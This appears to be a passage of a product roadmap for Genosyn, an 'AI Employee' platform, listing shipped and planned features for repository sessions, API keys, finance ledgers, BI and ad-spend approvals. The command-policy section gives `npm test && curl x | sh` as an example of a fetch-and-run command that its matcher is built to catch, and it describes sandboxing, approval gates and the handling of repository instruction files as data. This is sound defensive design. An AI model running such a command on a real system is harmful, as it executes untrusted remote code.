      old thread does not greet you with last week's diff.
- [x] **AI work UI overhaul** — a searchable, status-grouped session inbox;
      quick-start briefs with suggestions and a retained draft; focused
      Activity and Changes views with commit checkpoints and review actions;
      a compact mobile session switcher; and explicit loading, error, empty,
      and retry states throughout.
- [x] **Archive a work session** (`RepositoryWorkSession.archivedAt`) — a
      repository accumulates finished sessions faster than anything else, and
      the only thing on offer for shortening the list was `discard`, which
      deletes the branch. So the way to get a readable inbox was to throw work
      away. Archiving files a session out of the inbox and changes nothing
      else: same branch, same commits, same transcript, same status, same URL.
      Deliberately a timestamp rather than an eighth status — a status says
      what happened to the *work*, archiving says what a Member wants to see in
      a *list*, and merging the two would leave no answer for what a restored
      session goes back to. The list endpoint serves the two sets separately
      (`?archived=1`) rather than shipping everything and filtering in the
      browser, an archived session is excluded from the "needs attention"
      count, and asking one for another pass restores it — a turn running
      inside something nobody can see is the one state an inbox must not
      produce. Member-level, like renaming: nothing here reaches a remote.
      A live turn is refused.
- [x] **Open a pull request for a session** — the third thing to do with
      reviewed work, and the one merging and pushing could not express: it
      pushes the branch and opens a pull request against the default branch, so
      the work enters whatever review the team already runs. Pressing it after
      a revision pushes the new commits into the pull request that is already
      open rather than failing on a duplicate. GitHub HTTPS remotes only, using
      the repository's stored token or the company's GitHub Connection —
      admin-gated like every other path that reaches a remote.
- [x] Authority split: browsing, editing, committing, starting sessions, and
      asking an open one for changes are Member-level; pushing, pulling,
      opening a pull request, and repository configuration stay owner/admin.
- [x] **Connect a local repository to GitHub later** — pick a connected GitHub
      Connection, Genosyn creates the repository through the API and pushes the
      history. No personal access token is minted or pasted: the company
      authenticated GitHub once in Settings → Integrations and this reuses it.
      `Repository.githubConnectionId` pins which account publishes, which
      matters once a company has more than one connected. Pasting an existing
      empty clone URL does the same thing without the API call.
      An anonymous github.com HTTPS remote now authenticates pushes through
      that Connection too, so the whole path needs no stored credential.
      Session branches are deliberately excluded from the first push —
      unreviewed AI work must not reach a remote through a button that says
      nothing about AI.
- [x] The file tree respects `.gitignore`, with a toggle to show ignored
      entries. Without it a cloned code repository buries its own source under
      `node_modules` and hits the entry cap.
- [x] Repository search for Members (`git grep` over the checkout, literal and
      case-insensitive, untracked files included) — AI Employees already had it.
- [x] Syntax highlighting in the editor, README rendered on the Overview.
- [x] **AI work starts from the trunk, not from wherever the checkout was
      left.** A session took its base from the Member checkout's `HEAD` —
      whatever branch somebody last switched to, however far behind it had been
      left — so an employee could be handed a copy of the repository from weeks
      ago and produce a diff against history the team had already moved past.
      The fetch that runs before every session now resolves the base from
      `origin/<defaultBranch>` instead, and fast-forwards the local trunk as
      well where that costs nothing. Unpushed Member commits, a diverged trunk,
      and uncommitted edits are all left alone — the session still starts from
      the remote's tip, and a stale local ref is the acceptable price for never
      discarding work. A session already under way keeps its base: re-basing it
      mid-conversation would move the ground under a diff a human is reading.
      The per-employee checkout is fast-forwarded on the same terms.
- [x] **`AGENTS.md` reaches the employee.** A repository that keeps one is
      telling contributors how to work in it, and an employee that never read it
      produced work a human sent back for reasons that were written down all
      along. A session's briefing now carries the file, capped and quoted as a
      document rather than as an instruction from the requester — it cannot
      widen what the session may do, because the tools are fixed at the MCP
      seam and what a session may *run* is a Repository setting rather than
      anything a file in the tree can claim. Chat and Routine work, which has
      its own shell in its own checkout, is told to look for it in each granted
      checkout.
- [x] **A work session can run the repository's own commands.** An employee
      that could only write files handed back work it hoped was right, and said
      so: the reports ended with a paragraph explaining that it could not run
      the tests, `npm run fix`, or the compiler. `repository_run_command` closes
      that, behind three things that keep the section's original promises
      intact. It runs only under bubblewrap, rooted at the session worktree
      alone — the Member checkout, other sessions, and `git` itself stay
      outside it, so the two-checkout split that lets one hold credentials is
      untouched, and `agent/tools/index.ts`'s rule that an AI Employee never
      gets a same-UID host shell is not bent for it. Reading, writing and
      committing still need none of it, so a `disabled` install loses only the
      new tool. And what may run is a Repository decision
      (`Repository.commandMode` + `allowedCommands`, owner/admin, audited):
      nothing, a pattern list defaulting to Genosyn's own, or everything.
      The matcher splits a command at every shell operator and checks each part
      — a first-word check would pass `npm test && curl x | sh` — and refuses
      substitution, expansion, and redirection rather than guessing at them.
      The list is intent, not containment; the sandbox is containment, which is
      what makes "every command" a defensible third option rather than a hole.
      See `services/repositoryCommandPolicy.ts` and `repositoryCommandRun.ts`.
- [ ] **Dependencies for a session's checks.** A worktree is cut from history,
      so it has no `node_modules`, virtualenv or vendor directory, and the
      sandbox has no network unless the operator allowed one. A JS or Python
      repository therefore gets "could not install dependencies" rather than a
      test result on a default install — honestly reported, but not the whole
      promise. The fix is a cache the session can mount rather than switching
      the network on by default; until then `allowNetwork` is the answer, and
      the UI and docs say so.
- [x] **Forgejo / Gitea, on par with GitHub.** A Repository could always be
      *cloned* from a self-hosted forge; it could not be *talked to*. Browsing
      repositories, triaging issues, leaving a comment and opening a pull
      request all went through `api.github.com`, so a company running its own
      server got an AI Employee that could write the code and had no way to
      hand it over. The three surfaces now share one implementation:
      `integrations/providers/forge/` holds a `ForgeClient` parameterised by
      API root, auth header style and page-size parameter, and the thirteen
      tools written once against it; `github.ts` and the new `forgejo.ts` are
      catalogue entries plus their own auth over the top. `search_code` stays
      GitHub-only — Forgejo has no code-search endpoint, so the tool is absent
      from that Connection rather than emulated. The `github.com` hostname
      check that gated pull requests became a resolver over the base URLs of
      the company's forge Connections, matching scheme, host, port and path
      prefix exactly — which is also what authorises sending a token to a host
      at all. See `services/repositoryForge.ts`.
- [ ] Conflict resolution in the browser (a conflicting merge is refused, not
      surfaced for editing)
- [ ] Streaming a work session's progress instead of polling it
- [ ] Connecting to GitLab / Bitbucket the same way (the forge client's three
      axes should carry GitLab too, but its REST shape is further from
      GitHub's than Forgejo's is and nothing has been tested against it)

### M13 — Lightning ✅ → retired in 1.132.0

Both Lightning connectors (`lightning` over NWC/NIP-47 and `lightning-lnd`)
were removed once the Vault shipped: a wallet connection string or node
macaroon is a credential the company keeps, not a connector Genosyn
maintains. Existing Connections had their config moved into the Vault on
upgrade (`services/retiredIntegrationVaultBackfill.ts`).

What this milestone contributed and what survives it:

- [x] Generalized `Approval` entity with a `kind` discriminator and the
      dispatch in `services/approvals.ts` — **kept**. The pattern outlived
      the connector and now carries `ad_spend` and browser approvals.
- [x] `lightning_payment` remains a valid `Approval.kind` so historical rows
      still read, but nothing issues one any more.

### M14 — API Keys + REST API ✅

Programmatic access to the same surface humans use through the UI. Today
all routes are session-gated; this milestone introduces a Bearer-token
auth path that delegates to the same membership / role checks. Unlocks
external triggers, scripting, CI integration, and a public Cowork-style
plugin surface later.

- [x] `ApiKey` entity + migration. Fields: companyId (indexed), userId
      (owner), name, prefix (first 8 chars for display), tokenHash
      (sha256 hex of the random 32 bytes), lastUsedAt, expiresAt,
      revokedAt, createdAt.
- [x] Token format: `gen_<43 base64url chars>` (32 random bytes). Hash
      with sha256 — high-entropy random input doesn't need bcrypt and
      sha256 keeps the per-request lookup O(1) on an indexed column.
- [x] `requireAuth` extended: if no session, fall back to
      `Authorization: Bearer gen_…`. On match, set `req.userId = key.userId`,
      stash `req.apiKeyCompanyId` and `req.apiKey` for downstream guards
      to reject cross-company use.
- [x] `requireCompanyMember` rejects when an API key is presented for a
      company id other than the key's `companyId`, even if the underlying
      user is a member of both.
- [x] CRUD routes under `/api/companies/:cid/api-keys`:
      `GET` (list, no plaintext), `POST` (create, returns plaintext once
      and never again), `DELETE :id` (revoke).
- [x] Settings → API keys page mirroring the Secrets / Audit shape: table
      of keys with prefix + name + last-used + expires; "Generate" modal
      that surfaces the plaintext once with a copy button and warning;
      revoke confirmation.
- [x] Audit events on create / revoke.
- [x] **OpenAPI / Swagger docs** — registry-based spec generator at
      `server/openapi/`, served as `/api/openapi.json` (raw) and `/api/docs`
      (interactive Swagger UI). Both Bearer + cookie auth schemes
      pre-configured for try-it-out. Coverage today: auth, companies,
      api-keys (full M14), employees, routines + runs. Adding a new area
      = one more file under `server/openapi/`.

### M18 — Resources (knowledge ingestion) ✅

External material — articles, ebooks, transcripts — that an AI employee
should "study" and refer back to. Distinct from `EmployeeMemory` (atomic
durable facts, auto-injected into the prompt) and `Note` (human-authored
markdown the team writes together): a Resource is **content the team did
not write**, ingested once, queried on demand via the MCP surface.

> Originally shipped as "Learnings"; renamed to "Resources" so the
> vocabulary doesn't collide with the verb form ("learning something
> new") that already shows up across Skill / Memory copy. The follow-up
> migration `RenameLearningsToResources` drops the old tables and
> creates the new ones — there is no in-place data migration.

- [x] `Resource` entity — companyId, title, slug, sourceKind
      (`url` | `text` | `pdf` | `epub` | `video`), sourceUrl, sourceFilename,
      summary, bodyText (extracted plain text, capped at 1 MiB),
      tags (comma-joined string), bytes, status
      (`pending` | `ready` | `failed`), errorMessage, author bookkeeping.
- [x] `EmployeeResourceGrant` entity — employee → resource, with three
      escalating capabilities `read` < `edit` < `delete` (richer than
      notes' `read` / `write` because the team often wants employees
      that can keep a page tidy without authority to remove it).
- [x] Ingestion service `services/resources.ts`: _ URL → `fetch` + minimal HTML→text (no jsdom/readability dep) _ Plain text / `.txt` / `.md` / `.html` upload → store + index _ PDF upload → text via `pdf-parse` (new dep, flagged below) _ EPUB upload → unzip + collect XHTML body text via existing `unzipper` \* Video → accepted but flagged `failed` with a "transcripts coming
      soon" note (no ASR dep)
- [x] HTTP routes under `/api/companies/:cid/resources`: list, create
      (URL / paste / upload via multer, 25 MB cap), detail, patch
      (rename + retag + body for `text`-kind), delete, plus grant CRUD.
      The `/file` endpoint serves inline by default (so PDFs render in a
      browser viewer and the EPUB reader can fetch the bytes); pass
      `?disposition=attachment` to force a download.
- [x] MCP tools — read (any grant): `list_resources`,
      `search_resources`, `get_resource`. `create_resource` (text, URL, or —
      since M47 — a file the employee already holds; video still needs a human)
      is open to everyone and grants the author `delete` on the row. `update_resource` requires `edit` or
      higher; `delete_resource` requires `delete`. Teammates start at
      `read` on rows they didn't author and humans promote them from the
      share modal.
- [x] React UI under `/c/<co>/resources`: Notion-style centered layout
      with quick-add tiles (URL / Paste / Upload), search-as-you-type,
      compact list view, share modal. Detail page is type-aware —
      text resources are an editable markdown document, PDFs render in
      a native browser iframe, EPUBs render via `epubjs` with TOC and
      progress, videos use `<video>`, URL resources surface as a
      prominent "Open original" card. The auto-summary section was
      dropped from the detail page (still produced for the index list).
- [x] AppShell sidebar entry under "Knowledge".

**New dependencies:** `pdf-parse` (small, well-maintained, Node 22 OK)
for ingestion; `epubjs` + `jszip` for the EPUB reader on the detail
page. Avoided the bigger choice of an embeddings store + vector
search; v1 relies on substring matching over titles, summaries, and
`bodyText`, same as `search_notes`. Embeddings + RAG land in a future
milestone once we know what the team actually queries.

### M20 — Explore (Metabase-style BI)

Self-serve analytics over the database integrations the company already
connects. Distinct from `Base` (Airtable-style structured workspaces the
team writes into) and from running queries by hand inside the Postgres /
MySQL / ClickHouse integration tools: an **Explore** surface lets humans
and AI employees save SQL queries as named **Charts**, pick a
visualization (table, scalar, bar, line, area, pie), and pin those charts
onto **Dashboards** that other members can read at a glance.

Phase A — Foundation (this milestone)

- [x] **Entities.** `Chart` (companyId, slug, title, description,
      connectionId → IntegrationConnection, sql, vizType, vizConfig JSON,
      author bookkeeping). `Dashboard` (companyId, slug, title,
      description, author bookkeeping). `DashboardCard` (dashboardId,
      chartId, x/y/w/h grid placement, optional title override).
- [x] **Executor service** at `services/explore.ts` that resolves an
      `IntegrationConnection` of provider `postgres` / `mysql` /
      `clickhouse`, decrypts the per-provider config, and runs the
      caller's SQL through `pg` / `mysql2` / `@clickhouse/client`
      respectively. Wall-clock timeout 30s, row cap 5,000 — same envelope
      as the integration tools. Read-only is **not** enforced; users
      should connect with a least-privileged role.
- [x] **HTTP routes** under `/api/companies/:cid/explore/*`: list
      database-shaped connections, run ad-hoc SQL (`POST /run`), CRUD
      Charts + Dashboards, run a saved Chart, add/move/remove
      DashboardCards.
- [x] **Visualization** — six built-in types implemented as inline SVG
      so we don't add another chart-lib dep: `table`, `scalar`, `bar`,
      `line`, `area`, `pie`. A `ChartRenderer` component picks one based
      on `vizType` + `vizConfig` (which column is the dimension, which
      column(s) are measures, and stack/orientation flags for bar).
- [x] **React pages** at `/c/<co>/explore`: index (recent charts +
      dashboards + database sources), chart editor (SQL textarea +
      result preview + viz picker + viz config side panel), dashboard
      view (grid render), dashboard edit (card movement / size controls).
- [x] **Explore usability pass.** The Chart editor has a searchable live
      browser for visible schemas, tables, views, columns, and data types;
      one click builds and runs a safely quoted preview query, successful
      results offer a conservative visualization suggestion, and keyboard
      shortcuts plus unsaved-change protection make iteration safer. Dashboard
      creation captures useful context up front, cards are responsive, and edit
      mode exposes title overrides, understandable sizes, movement, and
      duplicate prevention. Shipped in 1.85.0.
- [x] **MCP tools** — `list_charts`, `get_chart`, `run_chart`,
      `create_chart`, `update_chart`, `delete_chart`, `list_dashboards`,
      `get_dashboard`, `create_dashboard`, `add_dashboard_card`. AI
      employees can author Charts the team will see in the same way
      they already author Notes and Bases.
- [x] **AI-native Explore loop.** AI employees can discover only their granted
      Postgres / MySQL / ClickHouse Connections, inspect the visible schema,
      validate ad-hoc SQL, save Charts, and assemble Dashboards through the
      built-in tool catalogue. Explore's **Build with AI** flow lets a Member
      select a Connection, grant it to an employee when needed, and open Chat
      with a ready-to-review analytics brief. Connection Grants are enforced
      again when an employee creates a Chart or changes its SQL. Shipped in
      1.87.0.

Phase B+ (deferred — out of this PR)

- Parameters / filters (date range, dropdown bound to a column).
- Scheduled deliveries (email a PNG of the dashboard at 9am).
- Embedding (public read-only links, signed).
- Snowflake / BigQuery / Redshift connectors.
- Native (no-SQL) query builder over a column picker.
- AI-suggested charts on a new connection.

### M15 — 2FA / TOTP + WebAuthn ✅

- [x] `TotpCredential` rows hold each encrypted seed; `User` keeps `recoveryCodes`
- [x] Multiple named authenticator apps — a code from any enrolled app signs you in
- [x] Enroll flow with QR (otpauth://… → render via `qrcode` dep), start to finish in one modal
- [x] Passkeys + FIDO2 USB security keys (WebAuthn), with multiple named credentials
- [x] Verify password and SSO logins when enabled; recovery-code path
- [ ] Per-company "require 2FA" admin policy (later)

### M16 — SSO login (Google / OIDC) (shipped)

Instance-wide single sign-on, configured from Admin → SSO and **disabled by
default**. Rather than reusing a company's `integrations.google` Connection
(login is instance-scoped, not company-scoped), the operator registers a
dedicated OAuth client and Genosyn runs a spec-minimal OIDC
authorization-code flow in-process — discovery document + `userinfo`, no JWT
libraries. Google is just a preset issuer; Okta / Keycloak / Entra ID / Auth0
work the same way.

- [x] Admin → SSO: enable toggle (off by default), Google or custom-OIDC
      issuer, client id + secret (encrypted at rest via `lib/secret.ts`),
      button-label override, "check issuer" discovery probe, callback URL
      readout
- [x] `User.ssoIssuer` + `User.ssoSubject` (unique pair, nullable); existing
      accounts link by verified email on first SSO sign-in
- [x] Login page grows a "Continue with …" button when enabled; SSO failures
      round-trip back to `/login?ssoError=…`
- [x] Auto-provision toggle — create accounts on first sign-in, or admit
      only existing/invited users
- [ ] Owner can require SSO for their company (deferred)

### M17 — Marketplace (planned)

- [ ] Export an employee as `{ soul, skills[], routines[], grants[] }`
      bundle
- [ ] Import a bundle to scaffold a new employee (extends Templates)
- [ ] Public-by-URL share — landing page on Home consumes the bundle JSON

### M19 — Finance (Invoicing + Accounting)

Native finance suite for the company. Customers, products, tax rates;
invoices with HTML render → browser-print to PDF and "Send" via the
existing per-company `EmailProvider`; payments tracked against invoices;
double-entry general ledger that auto-posts from the invoice lifecycle;
financial reports (P&L, Balance Sheet, Cash Flow); reconciliation against
Stripe payouts and Brex Cash transactions; Brex corporate card expense and
liability accounting; multi-currency with FX gain/loss;
period-close workflow;
accountant exports; vendor/bills mirror of the invoice flow. Distinct
from the Stripe **integration** (read-only catalog of customers /
charges / subscriptions), which stays as-is.

Money is stored as integer **minor units** (cents) plus a 3-letter ISO
currency code on every row. Phase A defaults everything to USD with a
per-invoice override; Phase E adds the FX rate engine. Invoice numbers
are gapless per-company sequences (`numberSeq` int, displayed as
`INV-0001`) — accountants need this for compliance.

Phased so each phase ships behind its own PR:

- [x] **Phase A — Customers + Invoices.** `Customer`, `Product`,
      `TaxRate`, `Invoice`, `InvoiceLineItem`, `InvoicePayment` entities.
      CRUD UI for all four. Invoice creator with line items + per-line tax
      (inclusive or exclusive). Status lifecycle draft → sent → paid (with
      manual mark-as-paid for now) / overdue (computed) / void. Print-
      friendly `InvoicePrint` page (browser → "Save as PDF"). "Send" button
      emails the customer the HTML invoice via the company
      `EmailProvider`. Top-level "Finance" sidebar entry. **No ledger
      yet.**
- [x] **Phase B — General Ledger.** `Account` (chart of accounts;
      seeded with a sane default CoA on first visit), `LedgerEntry`,
      `LedgerLine` (double-entry, balanced enforcement at the service
      layer — the entity is named `LedgerEntry` rather than the
      accountant-natural "JournalEntry" because the codebase already had
      a `JournalEntry` for per-employee diary feeds; product copy still
      says "journal"). Auto-post from invoice issued (DR AR / CR Revenue + Tax Payable), invoice paid (DR Bank / CR AR), invoice voided
      (reverses every entry tied to the invoice). Manual journal entry
      UI for accountants. Trial balance view.
- [x] **Phase C — Reports.** Income Statement (P&L), Balance Sheet,
      Cash Flow Statement. Period filters (this month / quarter / YTD /
      custom). Comparison columns (vs. prior period). Drill-through from
      any account row to a running-balance ledger of its source entries.
- [x] **Phase D — Reconciliation.** `BankFeed` (Stripe payouts and
      native Brex Cash sync; CSV import as the universal fallback),
      `BankTransaction` ingestion with auto-match heuristics (amount +
      date proximity), manual matching UI with ranked candidates, unmatch
      escape on reconciled rows. Re-uses the existing
      `IntegrationConnection` framework for credentials.
- [x] **Corporate card accounting.** `CardFeed` and `CardTransaction`
      ingest the complete settled Brex primary-card history. Purchases auto-post
      DR Expense / CR Corporate Card Payable, refunds reverse those legs, and
      statement collections post DR Card Payable / CR Bank. Expense-category
      changes create append-only reclassification entries; failed postings stay
      visible and retryable.
- [x] **Agentic transaction review.** Every `LedgerEntry` enters a Finance →
      Transactions review queue as unreviewed. AI employees can inspect the
      chart of accounts, transactions, and all standard statements through the
      built-in `finance` tool family; they stage expense/revenue category
      changes and mark the posting AI reviewed. Owners/admins receive a
      notification, inspect every debit and credit, then apply the balanced,
      append-only reclassification and give final approval. AI employees have
      no final-approval tool.
- [x] **Financial statement charts.** Reports now graph monthly P&L (revenue,
      expenses, net income), balance-sheet totals, and cash-flow movement from
      the same ledger calculations as their underlying tables. Long custom
      ranges show the most recent 24 months.
- **Phase E — Multi-currency.** `Currency`, `ExchangeRate`, and
  `CompanyFinanceSettings` (home currency). Per-invoice currency with
  FX gain/loss auto-posted on payment when the rate at payment differs
  from the rate at issue. Per-line audit columns on `LedgerLine`
  (`origCurrency`, `origAmountCents`, `rate`).
  **Composable tax-rule engine deferred to a follow-up phase** —
  Phase A's flat `TaxRate` continues to work and is sufficient for
  most jurisdictions; composable rules earn their complexity once a
  user actually hits the limit.
- [x] **Phase F — Period close + Accountant exports.**
      `AccountingPeriod` with open / closed status. Closing posts a
      single balancing entry into 3100 Retained Earnings and locks the
      window — `postLedgerEntry` refuses to write inside a closed
      period. Plain-CSV exports (customers / invoices / general journal /
      trial balance) cover the common accountant hand-off; IIF / Xero
      -shaped exports are deferred until a real user asks for them.
- [x] **Phase G — Vendor side.** `Vendor`, `Bill`, `BillLineItem`,
      `BillPayment`. Mirror of invoices but inbound — issue auto-posts
      DR per-line Expense / CR 2200 Accounts Payable; payment auto-posts
      DR Accounts Payable / CR Bank with FX gain/loss for foreign-
      currency bills (mirrors the customer flow). Vendors / Bills sub-
      nav under Finance.
- [x] **Phase A follow-up — Recurring invoices.** `RecurringInvoice` +
      `RecurringInvoiceLineItem` entities. Cron-driven heartbeat
      (`services/recurringInvoices.ts`) materializes a fresh `Invoice`
      on each tick, optionally auto-issuing + emailing it via the
      existing send path. Status lifecycle active → paused → ended;
      optional `maxRuns` and `endsOn` caps flip to ended automatically.
      Sidebar entry under Finance, dedicated list / new / detail pages
      with cron presets + human-readable schedule preview.
- [x] **AI recurring-invoice tools.** `list_recurring_invoices` and
      `get_recurring_invoice` give AI Employees with `read` Finance access the
      schedule and template context; `create_recurring_invoice` and
      `update_recurring_invoice` let employees with `invoice` access create,
      pause, resume, end, and revise schedules. Generated invoices are drafts
      by default. An employee must explicitly set `autoSend` to issue and email
      every future invoice automatically.
- [x] **Invoice delivery defaults.** Finance settings can hold internal
      always-Cc addresses that are merged into every customer invoice email,
      including manual sends, resends, and recurring auto-sends.
- [x] **Customers spun out — accounts, ACV + contracts.** Customers
      graduated from a Finance sub-page to their own top-level
      **Customers** section (Customers + Contracts sub-nav; old
      `/finance/customers` URLs redirect). Added an **Annual Contract
      Value** money column on `Customer` (`annualContractValueCents`,
      shown in the customer list) and a new `CustomerContract` entity for
      uploaded signed agreements — a global Contracts page plus a
      per-customer panel, with bytes on disk under `customer-contracts/`
      like other attachments and metadata-only rows in the DB.
- [x] **Customer statements.** Statement of account per customer, derived
      on the fly from issued invoices + payments (no entity): chronological
      charge/credit ledger with a running balance, opening/closing totals, and
      an aging summary (current / 1-30 / 31-60 / 61-90 / 90+). Per-currency
      with a switcher; period presets (all time default) plus a custom range.
      In-app view at `/customers/:slug/statement`, served as printable HTML and
      a downloadable PDF via the same `htmlToPdf` path invoices use
      (`services/customerStatement.ts` + `customerStatementHtml.ts`).
- [x] **AI finance access — grants + accounts-receivable tools.** `EmployeeFinanceGrant`
      gates the whole finance MCP surface per employee at `read` < `invoice`
      < `full`, managed from **Finance → AI access** (owners/admins only,
      `services/financeGrants.ts`). Previously the read/review `finance` tools
      were ungated (every employee could read the books); they now answer to
      the grant, and the surface runs accounts receivable end to end:
      `create_estimate` (creates an unsent, ledger-neutral draft for Member
      review), `create_invoice`, `send_invoice` (auto-issues drafts then emails
      the customer), `record_payment` (mark paid), `void_invoice`,
      `create_customer`, `update_customer`, `list_invoices`, `get_invoice`,
      `list_customers`, `get_customer`. Reads need `read`; the AR lifecycle
      needs `invoice`; staging a ledger review (`review_finance_transaction`)
      needs `full`. Each write records an AuditEvent (`actorKind: ai`) +
      JournalEntry; the grant level is injected into the employee prompt; an
      ungated employee's calls fail closed and its Finance tools are demoted in
      discovery (`grantDead`).

- **Phase H — Customer credits, refunds and write-offs.** Closes the
  "money only flows one way" gap. `CustomerCredit` (credit memo /
  deposit / overpayment), `CustomerCreditApplication`, `CustomerRefund`
  and `InvoiceWriteOff`. A credit note never touches `1200` AR — it parks
  the obligation in `2400 Customer Credits`, and only an *application*
  relieves a receivable, capped at `min(credit.open, invoice.balance)` so
  a negative receivable is structurally unreachable. A refund is the only
  operation that credits `1100 Bank`. A write-off is deliberately **not**
  a credit note: `DR 6100 Bad Debt Expense / CR 1200` leaves the original
  revenue recognized in the period it was earned. New system accounts
  `2400`, `2500 Customer Deposits` (unearned revenue — deposits post
  `DR 1100 / CR 2500` with no tax leg, correct for US sales tax; a VAT
  tax-point rule would need the deferred tax engine), `4100 Sales Returns
  & Allowances` (contra-revenue, typed `revenue` so the income statement
  nets it down with no report changes) and `6100`. Also fixes the void
  bug where `reverseLedgerEntriesForSources`' unpaired cross product let
  voiding a paid invoice reverse its payments and destroy collected cash.
  The AP mirror (vendor credits) is a follow-up.
  - [x] Void narrowed to the issue posting; settled and closed-period
        invoices and bills refused (shipped in 1.47.0).
  - [x] Foundations: the four system accounts, eight `LedgerEntrySource`
        members, `Invoice.creditedCents` / `writtenOffCents`,
        `BankTransaction.matchedCreditId` / `matchedRefundId`, and the
        cash-touching sources added to the cash-flow OPERATING set.
  - [x] Write-offs (bad debt G3 + immaterial residual G5). `InvoiceWriteOff`;
        DR 6100 Bad Debt Expense (overridable) / CR 1200 Accounts Receivable,
        both legs at the invoice's issue-date rate so it is always balanced and
        never carries an FX leg. Capped at the open balance, reversible (also
        the bad-debt-recovery path), reflected in the invoice balance/status
        (`written_off`) and the customer statement + aging. Human-facing on the
        invoice detail page; the AI `write_off_invoice` tool is deferred to M33.
        Shipped in 1.49.0.
  - [x] Credit notes + applications (non-cash half of G1). `CustomerCredit` +
        `CustomerCreditLine` + `CustomerCreditApplication`. Issue posts
        DR 4100 / DR 2100 / CR 2400, capped cumulatively against the source
        invoice on subtotal, tax and total. Apply posts DR 2400 / CR 1200
        (+ a bounded FX plug, last-draw-exact) capped at
        min(credit open, invoice balance) so AR can't go negative;
        unapply/void reverse from stored carrying amounts. Invoice shows a
        `credited` status; statement + aging include applications; voiding an
        invoice with credit (or a write-off) against it is refused. Credit
        notes list + detail, and a Credit note action on the invoice.
        Human-facing; AI credit tools deferred to M33. Shipped in 1.50.0.
  - [x] Refunds, deposits and overpayments (cash half of G1 + G4).
        `CustomerRefund`: DR 2400/2500 / CR 1100 (+ bounded FX plug,
        last-draw-exact) capped at the credit's open balance; reversible.
        Deposits post DR 1100 / CR 2500 (unearned revenue, no tax leg — US
        default). Overpayment on a payment splits into the applied portion
        and an on-account credit (DR 1100 / CR 2400), opt-in so the default
        stays refuse-overpayment for every existing caller and the AI path.
        Refund UI on the credit note; overpayment tick in the payment
        dialog. Deposit creation is API-only for now (a customer-picker
        composer is a fast-follow). AI refund/deposit tools deferred to M33.
        Shipped in 1.51.0.
  - [x] Ledger-delete guard (AP prerequisite): a `manual` entry carrying a
        sourceRefId — bill issue/payment, the period-close entry — is no longer
        hand-deletable through the single or bulk delete routes. Shipped in 1.52.0.
  - [x] Vendor credits (AP mirror, G6). `VendorCredit` / `VendorCreditLine` /
        `VendorCreditApplication` / `VendorRefund`, a `1300 Vendor Credits`
        asset, and `Bill.creditedCents`. Issue posts DR 1300 / CR each expense
        account / CR 2100; apply posts DR 2200 / CR 1300 capped at
        min(credit open, bill balance) so AP can't go negative (+ FX plug,
        sign-flipped from AR because the parking account is an asset); refund
        posts DR 1100 / CR 1300. Cumulative issue cap, unapply / void /
        void-refund, a `Vendor credit` action on the bill, and a Vendor credits
        list + detail. AI vendor-credit tools deferred to M33. Shipped in 1.52.0.

MCP surface (shipped): reads — `list_invoices`, `get_invoice`,
`list_recurring_invoices`, `get_recurring_invoice`, `list_customers`,
`get_customer`, `list_finance_accounts`,
`list_finance_transactions`, `get_finance_transaction`, `get_finance_report`
(`read`); accounts receivable — `create_invoice`, `send_invoice`,
`record_payment`, `void_invoice`, `create_recurring_invoice`,
`update_recurring_invoice`, `create_customer`, `update_customer` (`invoice`);
accounting review — `review_finance_transaction` (`full`).
Manual general-journal posting (`post_journal_entry`) over MCP is still
deferred — humans post manual journals from Finance → Journal.

### M26 — Paid Marketing (ad-platform Integrations + spend guardrails)

AI employees run, monitor, and optimize paid ad campaigns — safely. Native
Integrations for the platforms whose credential model fits self-hosting
(each company brings its own developer credentials; no central partner
app), read-first tools for pacing/reporting, and a deliberately tiny
mutation surface (pause / enable / budget change) where **every
spend-increasing write defaults to a human Approval**, generalizing the
Lightning spending-controls pattern. Platforms whose APIs are gated behind
slow human reviews (LinkedIn, X, TikTok) are served by the existing
browser tools + live take-over instead of native providers.

- [x] **Approval notifications for every kind.** `notifyApprovalPending`
      was routine-only; Lightning and browser approvals raised from chat
      never paged anyone. Now every pending Approval fans out bell +
      websocket + web-push to owners/admins, and the create-helpers in
      `services/approvals.ts` notify automatically.
- [x] **Guarded MCP tools.** Company-configured MCP servers can name
      guarded tool patterns (`ads_create_*`); matching calls queue an
      Approval (kind `mcp_tool`) with the verbatim call snapshotted and
      replay server-side on approve. Closes the hole where a write-capable
      external MCP server bypassed every Genosyn guardrail.
- [x] **Ads approval plumbing.** `ApprovalRequiredError` generalized
      beyond sats (kind + typed request payload, Lightning back-compat);
      new Approval kind `ad_spend` with create/execute/reject dispatch,
      before→after snapshot in the payload, and a drift check on replay
      (re-read the live object, abort if it changed since queueing).
- [x] **AdSpendEvent ledger.** Append-only, SQL-queryable record of every
      authorized budget delta (connection, employee, platform refs, signed
      minor-unit delta, approval id) — answers "how much did this employee
      authorize this month?" from the database. Rolling daily/monthly caps
      compute from it; caps re-run even on approved replay.
- [x] **Spend safety knobs per Connection** (`ads-shared.ts`, mirrors
      `lightning-shared.ts`): max single budget increase, rolling 24 h and
      30-day authorized-increase caps, `requireApprovalAbove` defaulting
      to 0 (every increase gated out of the box), and a kill switch that
      blocks all mutations. Spend-_decreasing_ actions (pause,
      budget-down) are fast-pathed — never blocked behind an approval —
      because pausing a runaway campaign is the emergency action.
- [x] **google-ads provider.** Rides the shared `google` OAuth app with an
      `adwords` scope group (the google-analytics precedent) + extra
      connect fields (developer token, login customer id). REST + GAQL:
      accounts, campaigns, reports, spend summary; gated pause/enable +
      budget mutations. API version pinned as a config constant.
- [x] **meta-ads provider.** API-key style: pasted Business Manager
      system-user token + ad account ids (no app review for a company's
      own accounts). Graph Marketing API insights + campaign reads, gated
      mutations, token-health `checkStatus`.
- [x] **microsoft-ads provider.** New `microsoft` OAuth app case
      (`msads.manage` + `offline_access`, rotating refresh tokens
      persisted via `ctx.setConfig`); Bing Ads REST v13 reads + gated
      mutations; developer token / customer id / account id connect fields.
- [x] **reddit-ads provider.** Rides the existing `reddit` OAuth app with
      ads scopes against `ads-api.reddit.com/api/v3`; hourly token refresh;
      reads + gated mutations.
- [x] **OAuth extra connect fields.** OAuth catalog entries can declare
      extra create-time fields (developer tokens, account ids) rendered in
      the connect modal and persisted into the encrypted config.
- [x] **Paid Marketing employee template** ("Sales & Marketing"): Soul
      encoding budget discipline (cite spend data, escalate anomalies,
      never raise budgets without approval), Skills for pacing checks and
      ROAS readouts joining ad spend against GA4 conversions and Finance
      invoices, Routines for a daily pacing check and weekly report.
- [x] **Docs + product surface.** Integrations docs sections per platform
      (incl. the Google OAuth consent-screen 7-day refresh-token trap and
      platform-side spending-limit backstops), browser-fallback recipe for
      LinkedIn / X / TikTok, Marketing product page on Home.

